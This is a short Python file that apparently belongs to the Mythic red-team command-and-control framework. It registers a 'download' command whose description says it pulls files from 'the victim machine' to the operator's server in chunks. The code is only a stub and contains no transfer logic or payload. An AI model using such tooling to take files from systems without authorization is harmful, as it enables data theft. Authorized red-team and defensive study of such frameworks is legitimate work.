from mythic_payloadtype_container.MythicCommandBase import *
import json


class DownloadArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            pass
        else:
            raise ValueError("Missing arguments")


class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download [path to remote file]"
    description = "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path)"
    version = 1
    author = "@Airzero24"
    argument_class = DownloadArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
